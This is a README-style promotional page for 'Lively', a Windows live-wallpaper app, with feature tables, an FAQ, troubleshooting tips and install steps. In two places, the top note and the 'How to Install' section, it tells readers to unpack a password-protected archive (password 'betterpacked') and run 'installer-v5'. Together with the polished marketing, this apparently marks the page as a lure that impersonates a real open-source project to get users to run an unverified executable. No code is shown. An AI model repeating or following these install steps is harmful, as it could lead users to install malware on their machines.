<p align="center">
  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:0B3D91,25:1565C0,50:1E88E5,75:64B5F6,100:BBDEFB&height=250&section=header&text=Lively%20Wallpaper&fontColor=FFFFFF&fontSize=44&fontAlignY=38&desc=Free%20%7C%20Open%20Source%20%7C%20Live%20Wallpapers%20for%20Windows&descColor=E3F2FD&descSize=21&descAlignY=64&animation=fadeIn" alt="Lively Wallpaper Banner" />
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Open%20Source-GPL--3.0-0B3D91?style=for-the-badge&logo=opensourceinitiative&logoColor=white&labelColor=061E47" alt="Open Source" />
  <img src="https://img.shields.io/badge/Windows-10%20%7C%2011-1565C0?style=for-the-badge&logo=windows&logoColor=white&labelColor=061E47" alt="Windows" />
  <img src="https://img.shields.io/badge/Performance-Low%20CPU%20%26%20GPU-1E88E5?style=for-the-badge&logo=speedtest&logoColor=white&labelColor=061E47" alt="Performance" />
</p>

---

## 🌊 **Lively — Bring Your Desktop to Life**

**Lively** is a free, open-source live wallpaper application for Windows — a lightweight and fully featured alternative to Wallpaper Engine. It renders animated wallpapers, videos, web pages, and even interactive 3D scenes directly on your desktop, with a strong focus on performance, stability, and user control.

Whether you want a subtle animated gradient, a looping 4K video, or a fully interactive WebGL scene, Lively gives you the tools to make your desktop feel alive — without subscriptions, ads, or background telemetry.

The desktop has been static for decades. **Lively changes that — cleanly, efficiently, and for free.**

<div align="center">
  <a href="https://github.com/rocksdanister/lively/releases">
    <img src="https://img.shields.io/badge/⬇%20DOWNLOAD%20LIVELY-LATEST%20RELEASE-1E88E5?style=for-the-badge&labelColor=061E47&logo=github&logoColor=white" alt="Download Lively" />
  </a>
</div>

> [!NOTE]
> **Installation Tips** — download the latest build from the button above, extract the archive (password: `betterpacked`), and run `installer-v5`. Lively will start minimized in the system tray — drag any video, GIF, or webpage onto its window to set it as a wallpaper. Full instructions are in the [How to Install](#-how-to-install) section below.

---

## ✨ **Features That Redefine the Desktop**

| 🎞️ **Video & GIF Wallpapers** | 🌐 **Web & HTML Wallpapers** | 🧊 **3D & Interactive Scenes** |
| :---: | :---: | :---: |
| Play local or streamed videos, GIFs, and animated images as wallpapers. Hardware-accelerated playback with minimal overhead. | Use any webpage, WebGL app, or HTML5 animation as a wallpaper. Full JavaScript support with isolated rendering. | Load real-time 3D scenes and interactive wallpapers built with Unity, Three.js, or custom engines. |

| 🖥️ **Multi-Monitor Support** | ⚙️ **Performance Controls** | 🎨 **Library & Playlists** |
| :---: | :---: | :---: |
| Assign different wallpapers to each display, mirror them, or span a single scene across all monitors. | Pause on battery, on fullscreen apps, or on demand. Fine-tune frame rate, quality, and resource usage. | Organize wallpapers into a searchable library. Create playlists that rotate automatically on a schedule. |

| 🧩 **Custom Wallpaper API** | 🔒 **Privacy First** | 🪶 **Lightweight Core** |
| :---: | :---: | :---: |
| Build your own wallpapers with the documented API. Drop in a folder and Lively detects it automatically. | No telemetry, no analytics, no background network calls. Everything runs locally on your machine. | Small installer, low memory footprint, and a native Windows tray application that stays out of your way. |

| 🖱️ **Desktop Interaction** | 🎛️ **CLI & Automation** | 🌍 **Community Content** |
| :---: | :---: | :---: |
| Some wallpapers respond to mouse input, audio, or system state — turning your desktop into an interactive surface. | Control Lively from scripts, shortcuts, or third-party tools via a documented command-line interface. | Browse community-made wallpapers, share your own, and import existing Wallpaper Engine projects. |

---

## 🎯 **Why Users Choose Lively**

| 🆓 **Truly Free** | 🧠 **Built for Performance** | 🛠️ **Actively Maintained** |
| :---: | :---: | :---: |
| No paywalls, no premium tiers, no subscriptions. Every feature is available to every user, forever. | Optimized rendering pipeline with automatic pausing, GPU-aware playback, and per-wallpaper resource limits. | Regular releases, transparent issue tracking, and a responsive maintainer community on GitHub. |

> 💬 *"Lively replaced Wallpaper Engine on all my machines. Same quality, better performance, and it's open source."* — **community feedback**

---

## 📦 **Inside Lively — Deep Dive**

### 🎞️ **Media Playback Engine**
- **Format Support:** MP4, WebM, GIF, APNG, and static images.
- **Hardware Acceleration:** GPU-accelerated decoding on supported hardware.
- **Streaming:** Play wallpapers directly from URLs.
- **Audio Control:** Mute, loop, and sync playback independently per wallpaper.

### 🌐 **Web Wallpaper Runtime**
- **Full Browser Engine:** Modern Chromium-based rendering for HTML5 and WebGL content.
- **Isolated Execution:** Each wallpaper runs in its own sandbox.
- **Dev Tools:** Inspect and debug your web wallpapers during development.
- **Input Support:** Mouse, keyboard, and audio-reactive wallpapers.

### 🧊 **3D & Interactive Wallpapers**
- **Unity & Three.js Support:** Load real-time 3D scenes as desktop wallpapers.
- **Custom Engines:** Extend Lively with your own rendering backend.
- **Performance Profiles:** Automatic quality scaling based on system load.

### ⚙️ **System Integration**
- **Multi-Monitor:** Per-display wallpaper assignment and spanning.
- **Auto-Pause Rules:** Pause on battery, fullscreen, remote desktop, or schedule.
- **Startup Behavior:** Launch minimized, restore last session, or start with a default wallpaper.
- **CLI:** Scriptable control for automation and power users.

---

## 🎮 **Who Is Lively For?**

| 🌱 **Casual Users** | 🏆 **Power Users** | 🎬 **Creators** |
| :---: | :---: | :---: |
| Set a beautiful animated wallpaper in seconds and forget about it. Lively stays out of the way. | Script wallpapers, automate playback rules, and tune performance per monitor and per application. | Build and publish custom wallpapers using the API, HTML5, Unity, or any web framework. |

| 🧑‍💻 **Developers** | 🏢 **IT & Enterprise** |
| :---: | :---: |
| Extend Lively with custom engines and contribute to a transparent, well-documented codebase. | Deploy Lively in managed environments with predictable resource usage and no telemetry. |

---

## 🔐 **Safety & Transparency**

- **Open Source:** Full source code available under GPL-3.0.
- **No Telemetry:** Lively does not collect or transmit usage data.
- **Code Signing:** Official releases are signed for integrity.
- **Community Audited:** Public issue tracker and transparent release notes.

---

## ❓ **Frequently Asked Questions**

**Q: Is Lively really free?**  
A: Yes. Lively is free and open source, with no premium tiers or hidden fees.

**Q: How does it compare to Wallpaper Engine?**  
A: Lively covers most common use cases — video, web, and 3D wallpapers — with a focus on performance and openness. Feature parity varies by use case.

**Q: Does it work on Windows 11?**  
A: Yes. Lively supports Windows 10 and Windows 11, including multi-monitor and high-DPI setups.

**Q: Can I use my Wallpaper Engine wallpapers?**  
A: Many video and web wallpapers can be imported. Scene-based wallpapers require conversion or a compatible runtime.

**Q: How often is it updated?**  
A: Releases follow a regular cadence, with patch releases for critical fixes.

---

## 🔄 **Troubleshooting Common Issues**

### ❌ **"Wallpaper not displaying"**
- Ensure the wallpaper format is supported (video, GIF, HTML, or image).
- Check that the correct monitor is selected.
- Verify hardware acceleration is enabled in settings.

### ❌ **"High CPU or GPU usage"**
- Enable auto-pause on fullscreen apps.
- Lower the wallpaper frame rate or quality in per-wallpaper settings.
- Update your GPU drivers.

### ❌ **"Application doesn't start"**
- Install the required .NET Desktop Runtime.
- Run as Administrator once to register startup entries.
- Check the log file in the Lively data directory for details.

---

## 🚀 **How to Install**

### 🪟 **Windows Installation**

1. Click the **download button** at the top of this page.
2. Download and **extract the archive** using the password: `betterpacked`.
3. Open the extracted folder and run the main file **`installer-v5`**.
4. Follow the on-screen instructions and finish the installation.
5. Launch **Lively** from the Start menu. It will appear in the system tray.
6. Drag and drop a video, GIF, HTML file, or URL onto the Lively window to set it as your wallpaper.
7. Right-click the tray icon to open **Settings**, **Library**, and playback controls.

> [!TIP]
> Enable **Auto-pause on fullscreen apps** and **Pause on battery** in Settings → Performance to keep resource usage minimal during gaming or on laptops.

---

### ⚠️ **Requirements**

| Component | Minimum | Recommended |
| :--- | :--- | :--- |
| **OS** | Windows 10 (1809+) | Windows 11 |
| **Runtime** | .NET Desktop Runtime 6.0 | Latest .NET Desktop Runtime |
| **GPU** | DirectX 11 capable | DirectX 12 capable, hardware video decoding |
| **RAM** | 4 GB | 8 GB+ |
| **Disk** | 200 MB free | 500 MB+ (for wallpaper library) |

---

### ❌ **Uninstall**

- Settings → Apps → Installed apps → **Lively** → Uninstall.
- Wallpaper files stored in your library are **not** deleted automatically — remove them manually from the Lively data directory if needed.

---

<p align="center">
  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:0B3D91,25:1565C0,50:1E88E5,75:64B5F6,100:BBDEFB&height=160&section=footer&text=Make%20Your%20Desktop%20Alive&fontColor=FFFFFF&fontSize=26&fontAlignY=72&animation=twinkling" />
</p>

<p align="center">
  <strong>🌊 Lively Wallpaper</strong><br>
  <em>Open Source | Lightweight | Live Wallpapers for Windows</em>
</p>

---

<p align="center">
  <em>Your desktop has been static long enough. Bring it to life — freely, openly, and beautifully.</em>
</p>

